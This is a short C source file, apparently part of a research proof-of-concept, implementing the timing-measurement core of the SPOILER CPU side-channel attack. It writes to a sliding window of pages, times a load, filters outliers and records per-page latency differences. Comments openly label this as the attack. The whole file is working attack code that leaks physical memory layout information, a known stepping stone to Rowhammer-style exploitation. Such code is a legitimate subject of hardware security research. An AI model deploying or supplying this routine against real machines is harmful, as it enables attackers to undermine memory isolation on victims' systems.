#include "../include/misc.h"
#include "../include/spoiler.h"

#define PAGE_SIZE 4096
#define THRESH_OUTLIER 600
#define SPOILER_ROUNDS 100

#define WINDOW 64

struct measurement *spoiler_measure(uint8_t *buffer, size_t buf_size, uint8_t *read) {
	struct measurement *ret = malloc(sizeof(struct measurement));
	size_t page_count = buf_size / PAGE_SIZE;
	ret->measurements = malloc(page_count * sizeof(uint64_t));
	ret->diffs = malloc(page_count * sizeof(uint64_t));

	// Warmup loop to prevent timing spikes
	for (int i = 0; i < 1000000; i++)
		asm volatile("nop");
	int t2_prev = 0; 
	// Here comes the SPOILER attack
	// for each page in [WINDOW...PAGE_COUNT)
	for (int p = WINDOW; p < page_count; p++) {
		uint64_t total = 0;
		int cc = 0;
		for (int r = 0; r < SPOILER_ROUNDS; r++) {
			uint32_t tt = 0;
			for (int i = WINDOW; i >= 0; i--) {
				buffer[(p - i) * PAGE_SIZE] = 0;
			}
			measure(read, &tt);

			if (tt < THRESH_OUTLIER) {
				total = total + tt;
				cc++;
			}
		}
		if (cc > 0) {
			uint64_t result = total / cc;
			ret->measurements[p] = result;
			if (total / SPOILER_ROUNDS < t2_prev) {
				ret->diffs[p] = 0;
			}
			else {
				ret->diffs[p] = (total / SPOILER_ROUNDS) - t2_prev;
			}
		}
		t2_prev = total / SPOILER_ROUNDS;
	}
	return ret;
}

void spoiler_free(struct measurement *m)
{
	free(m->measurements);
	free(m->diffs);
	free(m);
}

const uint64_t *measurements(const struct measurement *m)
{
	return m->measurements;
}

const uint64_t *diffs(const struct measurement *m)
{
	return m->diffs;
}
